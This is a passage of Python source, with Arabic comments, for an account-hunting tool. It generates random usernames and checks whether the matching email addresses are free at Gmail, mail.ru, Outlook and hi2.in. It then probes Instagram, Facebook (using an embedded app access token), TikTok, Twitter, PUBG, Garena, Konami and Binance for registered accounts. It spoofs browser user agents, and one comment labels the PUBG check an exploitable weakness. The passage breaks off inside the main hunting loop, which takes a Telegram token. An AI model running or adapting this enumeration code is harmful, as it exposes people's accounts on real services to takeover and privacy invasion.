def get_h(m="web"):
    ua = random.choice(BROWSER_DB)
    h = {'User-Agent': ua, 'Accept': '*/*', 'Connection': 'keep-alive'}
    if m == "insta": h.update({'X-IG-App-ID': '936619743392459', 'X-Requested-With': 'XMLHttpRequest'})
    elif m == "pubg": h.update({'Referer': 'https://www.pubgmobile.com/'})
    return h

class Platforms:
    @staticmethod
    def pubg(e):
        # ثغرة فحص ببجي عبر ربط الإيميل
        try:
            r = requests.get(f"https://www.pubgmobile.com/id/event/p_code/check?email={e}", headers=get_h("pubg"), timeout=8)
            return '"msg":"ok"' in r.text or "account" in r.text.lower()
        except: return False

    @staticmethod
    def freefire(e):
        # محاكاة فحص فري فاير (Garena)
        try:
            r = requests.post("https://auth.garena.com/api/v1/login/check_account", json={"account": e}, timeout=8)
            return r.json().get('status') == 1
        except: return False

    @staticmethod
    def twitter(e):
        try:
            r = requests.get(f"https://twitter.com/users/email_available?email={e}", headers=get_h(), timeout=8)
            return '"taken":true' in r.text
        except: return False

    @staticmethod
    def trading(e):
        # فحص منصات التداول (Binance/Exness)
        try:
            r = requests.post("https://www.binance.com/bapi/accounts/v1/public/account/check-email", json={"email": e}, timeout=8)
            return r.json().get('data') == True
        except: return False

    @staticmethod
    def efootball(e):
        try:
            r = requests.get(f"https://my.konami.net/auth/checkEmail.html?email={e}", timeout=8)
            return "registered" in r.text
        except: return False

    @staticmethod
    def social(e):
        # فحص فيسبوك، إنستا، تيك توك مدمج
        found = []
        try:
            # Insta
            ri = requests.post("https://www.instagram.com/api/v1/web/accounts/lookup_edit/", headers=get_h("insta"), data={'email': e}, timeout=7)
            if '"status":"ok"' in ri.text: found.append("Instagram")
            # FB
            rf = requests.get(f"https://b-graph.facebook.com/recover_accounts?q={e}&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32", timeout=7)
            if "network_info" in rf.text: found.append("Facebook")
            # TikTok
            rt = requests.get(f"https://www.tiktok.com/api/v1/check/email/?email={e}&aid=1233", timeout=7)
            if rt.json().get('is_registered') == 1: found.append("TikTok")
        except: pass
        return found

class Mailer:
    @staticmethod
    def is_available(e, dom):
        try:
            if 'gmail' in dom:
                r = requests.get(f"https://mail.google.com/mail/gxlu?email={e}", headers=get_h(), timeout=10)
                return 'COMPASS' not in str(r.headers)
            elif 'mail.ru' in dom:
                r = requests.get(f"https://account.mail.ru/api/v1/user/exists?email={e}", timeout=10)
                return '"exists":false' in r.text
            elif 'hotmail' in dom or 'outlook' in dom:
                r = requests.post("https://login.live.com/GetCredentialType.srf", json={"username": e}, timeout=10)
                return '"IfExistsResult":5' in r.text
            elif 'hi2.in' in dom:
                r = requests.get(f"https://api.hi2.in/v1/check?email={e}", timeout=10)
                return '"available":true' in r.text
            return False
        except: return False
class SmartGenerator:
    @staticmethod
    def generate(prefix, total_len=None):
        # إذا لم يتم تحديد طول، يتم اختيار طول عشوائي ذكي بين 7 و 10
        if total_len is None or total_len == 0:
            total_len = random.randint(7, 10)
        
        # خليط من الحروف الصغيرة والأرقام لضمان صيد حسابات حقيقية
        chars = string.ascii_lowercase + string.digits
        
        if not prefix:
            return ''.join(random.choice(chars) for _ in range(total_len))
        
        if len(prefix) >= total_len:
            return prefix
        
        needed = total_len - len(prefix)
        suffix = ''.join(random.choice(chars) for _ in range(needed))
        return prefix + suffix

def discovery_all_platforms(email):
    """محرك فحص شامل يجمع كل المنصات والألعاب التي طلبتها"""
    found = []
    # فحص التواصل الاجتماعي
    social_hits = Platforms.social(email)
    if social_hits: found.extend(social_hits)
    
    # فحص الألعاب (ببجي، فري فاير، فوتبول)
    if Platforms.pubg(email): found.append(f"{X}PUBG")
    if Platforms.freefire(email): found.append(f"{F}FreeFire")
    if Platforms.efootball(email): found.append(f"{B}eFootball")
    
    # فحص التداول وتويتر وسناب
    if Platforms.twitter(email): found.append(f"{S}Twitter")
    if Platforms.trading(email): found.append(f"{M}Trading")
    
    return found

def hunter_engine_logic(mode, prefix, length, domains, token, chat_id):
    global hits, bad, checked, stop_thread, session_hits
    
    while not stop_thread:
        try:
            # توليد يوزر (أحرف + أرقام)
